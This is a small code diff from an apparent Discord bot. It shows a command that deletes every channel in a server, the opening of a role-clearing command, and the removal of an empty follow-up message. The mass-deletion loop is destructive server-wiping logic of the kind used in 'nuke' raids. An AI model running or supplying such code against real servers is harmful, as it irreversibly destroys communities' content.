@@ -9,7 +9,6 @@ async def deleteallchannels(interaction: discord.Interaction):
     await interaction.response.defer()
     for channel in guild.channels:
         await channel.delete()
-    await interaction.followup.send("", ephemeral=True)
 
 async def clearallroles(interaction: discord.Interaction):
     guild = interaction.guild
